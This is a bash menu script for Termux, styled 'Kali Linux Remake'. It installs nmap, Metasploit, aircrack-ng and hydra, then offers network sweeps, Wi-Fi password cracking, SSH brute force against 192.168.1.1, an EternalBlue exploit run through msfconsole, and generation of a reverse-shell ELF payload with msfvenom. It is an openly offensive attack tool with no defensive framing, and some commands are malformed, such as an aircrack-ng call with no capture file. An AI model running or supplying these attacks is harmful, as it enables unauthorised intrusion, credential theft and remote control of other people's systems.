#!/bin/bash

# Display 'Kali Linux Remake' with figlet
echo " "
figlet "Kali Linux Remake"
echo " "

# Update packages and install necessary tools
echo "[+] Updating Termux packages..."
pkg update -y && pkg upgrade -y

echo "[+] Installing dependencies..."
pkg install -y nmap metasploit git curl wget python aircrack-ng hydra vim figlet

# Information gathering functions
function gather_info() {
    echo "[+] Gathering system information..."
    echo "System Information:"
    uname -a
    echo "Disk space usage:"
    df -h
    echo "Running Nmap to discover devices on the network..."
    nmap -sn 192.168.1.0/24
}

# Penetration testing functions
function pentest() {
    echo "[+] Starting penetration test..."

    # Quick scan with Nmap
    echo "[+] Running quick Nmap scan..."
    nmap -v -A 192.168.1.1

    # Cracking Wi-Fi passwords with Aircrack-ng
    echo "[+] Trying to crack Wi-Fi password with Aircrack-ng..."
    aircrack-ng -a2 -b "00:11:22:33:44:55" -w /usr/share/wordlists/rockyou.txt

    # Brute force attempt with Hydra
    echo "[+] Attempting brute force with Hydra..."
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
}

# Exploitation function
function exploit() {
    echo "[+] Starting exploitation..."
    echo "[+] Running Metasploit..."
    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; exploit"
}

# Payload generation function
function generate_payload() {
    echo "[+] Generating reverse payload..."
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf
    chmod +x payload.elf
    echo "[+] Payload generated successfully!"
}

# Automation function
function automation() {
    echo "[+] Starting script automation..."
    # Loop for collecting information periodically
    while true; do
        gather_info
        sleep 60  # Collect info every 1 minute
    done
}

# Interactive menu
function menu() {
    echo "Choose an option:"
    echo "1) Gather information"
    echo "2) Perform penetration test"
    echo "3) Exploit with Metasploit"
    echo "4) Generate reverse payload"
    echo "5) Automation"
    echo "6) Exit"
    read -p "Choose: " choice

    case $choice in
        1) gather_info ;;
        2) pentest ;;
        3) exploit ;;
        4) generate_payload ;;
        5) automation ;;
        6) exit ;;
        *) echo "Invalid option"; menu ;;
    esac
}

# Display the initial menu
menu
